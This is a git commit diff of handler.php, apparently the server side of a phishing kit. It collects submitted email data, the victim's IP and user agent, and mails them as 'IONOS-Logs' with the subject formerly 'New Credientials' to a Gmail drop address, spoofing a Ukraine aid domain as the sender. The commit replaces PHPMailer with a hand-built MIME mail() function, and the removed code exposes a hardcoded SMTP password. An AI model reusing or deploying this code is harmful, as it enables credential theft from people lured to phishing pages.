b6d1adaa72d1d1ca5baecdfd02f98caf183df90c
Chidindu Emmanuel Aneke <86878828+Jace-Tech@users.noreply.github.com>
2022-10-18 18:36:54 +0100

    Updated the handler

--- handler.php
+++ handler.php
@@ -3,7 +3,7 @@
 header("Access-Control-Allow-Origin: *");
 header("Content-Type: application/json");
 
-use PHPMailer\PHPMailer\PHPMailer;
+// use PHPMailer\PHPMailer\PHPMailer;
 // use PHPMailer\PHPMailer\Exception;
 
 
@@ -16,102 +16,102 @@ require './vendor/autoload.php';
 $EMAIL = "gottmacht.empire@gmail.com";
 $SENDER_EMAIL = "info@ukrainefreeaids.org";
 
-function sendMail($subject, $message, $file)
-{
-    global $EMAIL;
-    global $SENDER_EMAIL;
-
-    //Create an instance; passing `true` enables exceptions
-    $mail = new PHPMailer(true);
-    $filename = pathinfo($file, PATHINFO_FILENAME);
-
-    try {
-        //Server settings
-        $mail->SMTPDebug = 2;                      //Enable verbose debug output
-        $mail->isSMTP();                                            //Send using SMTP
-        $mail->Host       = 'mail.ukrainefreeaids.org';                     //Set the SMTP server to send through
-        $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
-        $mail->Username   = 'user@example.com';                     //SMTP username
-        $mail->Password   = 'Treasures231@!';                               //SMTP password
-        $mail->SMTPSecure = "tsl";            //Enable implicit TLS encryption
-        $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
-
-        //Recipients
-        $mail->setFrom($SENDER_EMAIL, 'Office M3sh');
-        $mail->addAddress($EMAIL);     //Add a recipient
-        $mail->addReplyTo($SENDER_EMAIL, 'Office M3sh');
-
-        //Attachments
-        $mail->addAttachment($file, $filename);    //Optional name
-
-        //Content
-        $mail->isHTML(true);                                  //Set email format to HTML
-        $mail->Subject = $subject;
-        $mail->Body    = $message;
-        $mail->AltBody = $message;
-
-        $mail->send();
-       return ["message" => 'Message has been sent', "error" => false];
-    } catch (Exception $e) {
-        return ["message" => '', "error" => "Message could not be sent. Mailer Error: {$mail->ErrorInfo}"];
-    }
-}
-
-// function sendEmail($message, $subject = "New Credientials", $file = "")
+// function sendMail($subject, $message, $file)
 // {
 //     global $EMAIL;
 //     global $SENDER_EMAIL;
 
-
-//     // Normal
-//     // $headers  = 'MIME-Version: 1.0' . "\r\n";
-//     // $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
-
-//     // Create email headers
-//     // $headers .= "From: Office M3sh<$SENDER_EMAIL>\r\n";
-//     // $headers .= "Reply-to: $SENDER_EMAIL\r\n";
-
-//     // return mail($EMAIL, $subject, $message, $headers, "-f$SENDER_EMAIL");
-
-
-//     // OTHER 
+//     //Create an instance; passing `true` enables exceptions
+//     $mail = new PHPMailer(true);
 //     $filename = pathinfo($file, PATHINFO_FILENAME);
 
-//     $content = file_get_contents($file);
-//     $content = chunk_split(base64_encode($content));
+//     try {
+//         //Server settings
+//         $mail->SMTPDebug = 2;                      //Enable verbose debug output
+//         $mail->isSMTP();                                            //Send using SMTP
+//         $mail->Host       = 'mail.ukrainefreeaids.org';                     //Set the SMTP server to send through
+//         $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
+//         $mail->Username   = 'user@example.com';                     //SMTP username
+//         $mail->Password   = 'Treasures231@!';                               //SMTP password
+//         $mail->SMTPSecure = "tsl";            //Enable implicit TLS encryption
+//         $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
 
-//     // a random hash will be necessary to send mixed content
-//     $separator = md5(time());
+//         //Recipients
+//         $mail->setFrom($SENDER_EMAIL, 'Office M3sh');
+//         $mail->addAddress($EMAIL);     //Add a recipient
+//         $mail->addReplyTo($SENDER_EMAIL, 'Office M3sh');
 
-//     // carriage return type (RFC)
-//     $eol = "\r\n";
+//         //Attachments
+//         $mail->addAttachment($file, $filename);    //Optional name
 
-//     $headers  = 'MIME-Version: 1.0' . $eol;
-//     $headers .= "Content-Type: multipart/mixed; boundary=\"" . $separator . "\"" . $eol;
-//     $headers .= "Content-Transfer-Encoding: 7bit" . $eol;
-//     $headers .= "This is a MIME encoded message." . $eol;
+//         //Content
+//         $mail->isHTML(true);                                  //Set email format to HTML
+//         $mail->Subject = $subject;
+//         $mail->Body    = $message;
+//         $mail->AltBody = $message;
 
-//     // Create email headers
-//     $headers .= "From: Office M3sh<$SENDER_EMAIL>" . $eol;
-//     $headers .= "Reply-to: $SENDER_EMAIL" . $eol;
-
-//     // Message
-//     $body = "--" . $separator . $eol;
-//     $body .= "Content-Type: text/html; charset=\"iso-8859-1\"" . $eol;
-//     $body .= "Content-Transfer-Encoding: 8bit" . $eol;
-//     $body .= $message . $eol;
-
-//     // attachment
-//     $body .= "--" . $separator . $eol;
-//     $body .= "Content-Type: application/json; name=\"" . $filename . "\"" . $eol;
-//     $body .= "Content-Transfer-Encoding: base64" . $eol;
-//     $body .= "Content-Disposition: attachment" . $eol;
-//     $body .= $content . $eol;
-//     $body .= "--" . $separator . "--";
-
-
-//     return mail($EMAIL, $subject, $body, $headers, "-f$SENDER_EMAIL");
+//         $mail->send();
+//        return ["message" => 'Message has been sent', "error" => false];
+//     } catch (Exception $e) {
+//         return ["message" => '', "error" => "Message could not be sent. Mailer Error: {$mail->ErrorInfo}"];
+//     }
 // }
+
+function sendEmail($subject, $message, $file = "")
+{
+    global $EMAIL;
+    global $SENDER_EMAIL;
+
+
+    // Normal
+    // $headers  = 'MIME-Version: 1.0' . "\r\n";
+    // $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
+
+    // Create email headers
+    // $headers .= "From: Office M3sh<$SENDER_EMAIL>\r\n";
+    // $headers .= "Reply-to: $SENDER_EMAIL\r\n";
+
+    // return mail($EMAIL, $subject, $message, $headers, "-f$SENDER_EMAIL");
+
+
+    // OTHER 
+    $filename = pathinfo($file, PATHINFO_FILENAME);
+
+    $content = file_get_contents($file);
+    $content = chunk_split(base64_encode($content));
+
+    // a random hash will be necessary to send mixed content
+    $separator = md5(time());
+
+    // carriage return type (RFC)
+    $eol = "\r\n";
+
+    $headers  = 'MIME-Version: 1.0' . $eol;
+    $headers .= "Content-Type: multipart/mixed; boundary=\"" . $separator . "\"" . $eol;
+    $headers .= "Content-Transfer-Encoding: 7bit" . $eol;
+    $headers .= "This is a MIME encoded message." . $eol;
+
+    // Create email headers
+    $headers .= "From: Office M3sh<$SENDER_EMAIL>" . $eol;
+    $headers .= "Reply-to: $SENDER_EMAIL" . $eol;
+
+    // Message
+    $body = "--" . $separator . $eol;
+    $body .= "Content-Type: text/html; charset=\"iso-8859-1\"" . $eol;
+    $body .= "Content-Transfer-Encoding: 8bit" . $eol;
+    $body .= $message . $eol;
+
+    // attachment
+    $body .= "--" . $separator . $eol;
+    $body .= "Content-Type: application/json; name=\"" . $filename . "\"" . $eol;
+    $body .= "Content-Transfer-Encoding: base64" . $eol;
+    $body .= "Content-Disposition: attachment" . $eol;
+    $body .= $content . $eol;
+    $body .= "--" . $separator . "--";
+
+
+    return mail($EMAIL, $subject, $body, $headers, "-f$SENDER_EMAIL");
+}
 
 if (isset($_REQUEST['send'])) {
     $email = $_REQUEST['email'];
@@ -209,7 +209,7 @@ if (isset($_REQUEST['send'])) {
         $message = str_replace("{{ip}}", $ip, $message);
         $message = str_replace("{{agent}}", $agent, $message);
 
-        $mail = sendMail("IONOS-Logs | $ip", $message, $filename);
+        $mail = sendEmail("IONOS-Logs | $ip", $message, $filename);
         if ($mail["error"]) throw new Exception("Could not send");
 
         unlink($filename);
